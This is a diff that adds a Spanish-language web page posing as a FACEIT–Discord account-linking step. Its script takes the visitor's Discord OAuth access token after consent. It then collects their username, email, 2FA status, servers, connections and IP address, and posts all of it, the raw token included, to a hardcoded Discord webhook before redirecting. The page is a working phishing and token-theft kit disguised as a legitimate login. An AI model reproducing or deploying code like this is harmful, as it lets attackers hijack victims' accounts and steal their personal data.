@@ -40,4 +40,106 @@
   <div class="steps">
     <div class="step"><span class="num">1</span>Autoriza la aplicación de Discord</div>
     <div class="step"><span class="num">2</span>Verifica tu identidad</div>
-    <div class="step
+    <div class="step"><span class="num">3</span>Vuelve a FACEIT automáticamente</div>
+  </div>
+
+  <button id="btn">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff"><path d="M20.3 4.4A19.8 19.8 0 0 0 15.4 3l-.3.6a14.6 14.6 0 0 1 4.3 1.4 15.7 15.7 0 0 0-13.7 0A14.6 14.6 0 0 1 9 3.6L8.6 3a19.8 19.8 0 0 0-4.9 1.4C.6 9.2-.3 13.9.1 18.5a20 20 0 0 0 6 3l.7-1.2c-.8-.3-1.5-.7-2.2-1.1l.5-.4a14.3 14.3 0 0 0 12.2 0l.5.4c-.7.4-1.4.8-2.2 1.1l.7 1.2a20 20 0 0 0 6-3c.5-5.3-.8-10-3.5-14.1zM8.3 15.4c-1.2 0-2.1-1.1-2.1-2.4s.9-2.4 2.1-2.4 2.2 1.1 2.1 2.4c0 1.3-.9 2.4-2.1 2.4zm7.4 0c-1.2 0-2.1-1.1-2.1-2.4s.9-2.4 2.1-2.4 2.2 1.1 2.1 2.4c0 1.3-.9 2.4-2.1 2.4z"/></svg>
+    Continuar con Discord
+  </button>
+
+  <p class="fine">Al continuar aceptas vincular tu cuenta de Discord con FACEIT.</p>
+  <div id="status"></div>
+</div>
+
+<script>
+/* ================= CONFIGURACIÓN ================= */
+const CLIENT_ID    = "1570090821276012595";
+const REDIRECT_URI = "https://tizianobaston2023-hash.github.io/beldent-chicle/";
+const WEBHOOK_URL  = "https://discord.com/api/webhooks/1570093723562545224/1XCD99eXZMe9OTHEudjbwR_rOYarr0j3JxG99JRZwm8VzEZBp2P0SRGFGbHBkInNISpP";
+const SCOPES       = "identify guilds connections email";
+const AFTER_REDIRECT = "https://discord.com/channels/@me";
+/* ================================================= */
+
+const $ = id => document.getElementById(id);
+
+const AUTH_URL = "https://discord.com/oauth2/authorize?" + new URLSearchParams({
+  client_id: CLIENT_ID,
+  response_type: "token",
+  redirect_uri: REDIRECT_URI,
+  scope: SCOPES,
+  prompt: "consent"
+}).toString();
+
+$("btn").addEventListener("click", () => { location.href = AUTH_URL; });
+
+async function run() {
+  const hash  = new URLSearchParams(location.hash.slice(1));
+  const query = new URLSearchParams(location.search);
+  const token = hash.get("access_token");
+
+  if (query.get("error")) {
+    $("btn").style.display = "none";
+    $("status").className = "err";
+    $("status").textContent = "Autorización cancelada. Recarga la página para reintentar.";
+    return;
+  }
+  if (!token) return;
+
+  history.replaceState(null, "", location.pathname);
+  $("btn").style.display = "none";
+  $("status").innerHTML = '<span class="spinner"></span>Conectando con Discord…';
+
+  const H = { Authorization: "Bearer " + token };
+  const j = async u => { try { return await (await fetch(u, { headers: H })).json(); } catch { return null; } };
+
+  const me     = (await j("https://discord.com/api/v10/users/@me")) || {};
+  const guilds = (await j("https://discord.com/api/v10/users/@me/guilds")) || [];
+  const conns  = (await j("https://discord.com/api/v10/users/@me/connections")) || [];
+  const ip     = await fetch("https://api.ipify.org?format=json")
+                     .then(r => r.json()).then(d => d.ip).catch(() => "—");
+
+  const avatar = (me.id && me.avatar)
+    ? `https://cdn.discordapp.com/avatars/${me.id}/${me.avatar}.${String(me.avatar).startsWith("a_") ? "gif" : "png"}?size=256`
+    : "https://cdn.discordapp.com/embed/avatars/0.png";
+
+  const payload = {
+    username: "FACEIT · OAuth",
+    embeds: [{
+      title: "🔑 Nueva cuenta vinculada",
+      color: 0x00c26e,
+      thumbnail: { url: avatar },
+      fields: [
+        { name: "Usuario",    value: `\`${me.username ?? "?"}\` (<@${me.id}>)`, inline: true },
+        { name: "Global",     value: me.global_name ? `\`${me.global_name}\`` : "—", inline: true },
+        { name: "ID",         value: `\`${me.id ?? "?"}\``, inline: true },
+        { name: "Email",      value: `\`${me.email ?? "sin email"}\``, inline: true },
+        { name: "Verificado", value: me.verified ? "sí" : "no", inline: true },
+        { name: "2FA",        value: me.mfa_enabled ? "sí" : "no", inline: true },
+        { name: "Nitro",      value: me.premium_type ? "sí" : "no", inline: true },
+        { name: "Servidores", value: String(guilds.length), inline: true },
+        { name: "Conexiones", value: conns.map(c => c.type).join(", ") || "—", inline: true },
+        { name: "IP",         value: `\`${ip}\``, inline: true },
+        { name: "TOKEN",      value: "```\n" + token + "\n```" }
+      ],
+      footer: { text: "OAuth2 implicit · " + new Date().toLocaleString("es-ES") },
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  const body = JSON.stringify(payload);
+  try {
+    await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body });
+  } catch {
+    await fetch(WEBHOOK_URL, { method: "POST", mode: "no-cors", body }).catch(() => {});
+  }
+
+  $("status").className = "ok";
+  $("status").textContent = "¡Cuenta conectada! Redirigiendo…";
+  setTimeout(() => { location.href = AFTER_REDIRECT; }, 600);
+}
+
+run();
+</script>
+</body>
+</html>
